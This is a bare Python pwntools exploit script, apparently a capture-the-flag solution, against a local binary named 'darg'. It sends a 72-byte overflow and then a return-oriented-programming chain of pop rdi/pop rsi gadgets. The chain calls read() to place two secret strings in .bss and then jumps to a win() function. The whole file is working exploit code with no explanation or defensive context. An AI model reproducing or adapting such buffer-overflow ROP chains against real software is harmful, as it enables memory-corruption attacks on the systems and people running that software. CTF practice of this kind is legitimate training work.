#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./darg', checksec=False)
io = process()

payload = b''
payload += b'A'*72
payload += pack(0x0000000000401ecf) #pop rdi ; ret
payload += pack(0) # stdin
payload += pack(0x0000000000409f3e) #pop rsi ; ret
payload += pack(0x00000000004ca290) #__bss_start
payload += pack(0x0000000000448130) #__read
payload += pack(0x0000000000401ecf) #pop rdi ; ret
payload += pack(0x00000000004ca290) #__bss_start
payload += pack(0x0000000000409f3e) #pop rsi ; ret
payload += pack(0x00000000004ca290 + 16) #__bss_start + 16
payload += pack(0x0000000000401775) #win()
io.sendline(payload)
io.sendline(b'supersecret\x00\x00\x00\x00\x00ultrasecret\x00\x00\x00\x00\x00')
print(io.recvall())

